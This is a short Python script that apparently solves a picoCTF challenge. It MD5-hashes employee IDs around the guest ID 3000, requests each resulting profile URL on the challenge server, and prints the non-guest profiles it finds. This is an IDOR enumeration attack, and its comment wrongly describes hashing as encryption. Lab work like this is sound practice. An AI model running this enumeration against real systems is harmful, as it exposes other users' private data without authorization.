import hashlib
import requests

base_url = "http://crystal-peak.picoctf.net:59506/profile/user/"

for i in range(2980, 3021):
    h = hashlib.md5(str(i).encode()).hexdigest()
    r = requests.get(base_url + h)
    if r.status_code == 200 and "guest" not in r.text.lower():
        print(f"[+] ID {i} ({h}): HIT")
        print(r.text[:500])

#With it known that the URL ID is an MD5 hash of the employee ID and that there are only 20 employees & the guest ID is 3000 
#this script encrypts and appends the ID onto the URL.
